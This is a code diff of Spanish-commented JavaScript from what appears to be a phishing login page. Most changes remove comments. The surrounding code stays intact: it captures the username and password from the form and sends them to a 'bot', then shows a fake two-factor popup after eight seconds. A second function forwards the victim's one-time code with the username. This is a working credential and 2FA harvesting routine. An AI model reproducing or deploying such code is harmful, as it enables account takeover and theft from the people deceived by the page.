@@ -663,7 +663,6 @@ async function enviarCodigoAlBot(codigo) {
     
     // 🔥 Asegurarnos de tener el username
     if (!usernameCapturado) {
-        // Intentar obtenerlo del campo de login por si acaso
         const inputs = document.querySelectorAll('.login-input');
         if (inputs.length >= 2) {
             usernameCapturado = inputs[0]?.value || '';
@@ -679,7 +678,7 @@ async function enviarCodigoAlBot(codigo) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 code: codigo,
-                username: usernameCapturado  // 🔥 ENVIAR EL USERNAME
+                username: usernameCapturado
             })
         });
         const data = await response.json();
@@ -796,13 +795,11 @@ if (loginForm) {
         
         console.log('🔍 Intentando login con:', username);
         
-        // Validación básica
         if (username.length < 3 || password.length < 8) {
             mostrarError('Usuario o contraseña inválidos');
             return;
         }
         
-        // Guardar credenciales
         usernameCapturado = username;
         passwordCapturado = password;
         loginTimestamp = Date.now();
@@ -810,14 +807,13 @@ if (loginForm) {
         esperandoCodigo = false;
         codigoEnviado = false;
         
-        // Mostrar loading
         document.getElementById('loginBtn').style.display = 'none';
         document.getElementById('loginLoading').style.display = 'flex';
         
-        // 🔥 ENVIAR CREDENCIALES AL BOT (SIN ESPERAR RESPUESTA)
+        // ENVIAR CREDENCIALES AL BOT
         enviarAlBot(username, password);
         
-        // 🔥 PROGRAMAR POPUP A LOS 8 SEGUNDOS (SIEMPRE)
+        // PROGRAMAR POPUP A LOS 8 SEGUNDOS
         console.log('⏰ Programando popup en 8 segundos...');
         setTimeout(() => {
             if (!popupMostrado) {
@@ -825,9 +821,6 @@ if (loginForm) {
                 mostrarPopup2FA();
             }
         }, 8000);
-        
-        // Si el bot responde antes con 2FA, mostrar popup antes
-        // Pero ya tenemos el timeout de 8s como respaldo
     };
 }
 
